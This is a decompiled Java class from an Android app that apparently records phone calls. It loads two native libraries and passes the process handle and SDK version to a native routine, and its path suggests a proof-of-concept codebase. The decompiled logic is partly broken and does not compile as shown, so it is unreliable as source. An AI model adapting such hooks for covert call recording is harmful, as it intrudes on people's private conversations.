package com.krecorder.call.callrecorder;

import android.os.Build.VERSION;
import android.os.Process;
import com.vvt.ak.a;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class NativeAosp
{
  private static final boolean a = a.e;
  private static final boolean b = a.a;
  
  static
  {
    System.loadLibrary("kmb");
    System.loadLibrary("kma");
  }
  
  public static long a(int paramInt)
  {
    long l = -1;
    try
    {
      byte[] arrayOfByte = a();
      l = c(paramInt, arrayOfByte);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = a;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return l;
  }
  
  private static byte[] a()
  {
    long l = i(Process.myPid());
    ByteBuffer localByteBuffer = ByteBuffer.allocate(268);
    ByteOrder localByteOrder = ByteOrder.LITTLE_ENDIAN;
    localByteBuffer.order(localByteOrder);
    localByteBuffer.putLong(l);
    int i = Build.VERSION.SDK_INT;
    localByteBuffer.putInt(i);
    return localByteBuffer.array();
  }
  
  private static native long c(int paramInt, byte[] paramArrayOfByte);
  
  private static native long i(int paramInt);
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/call/callrecorder/NativeAosp.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */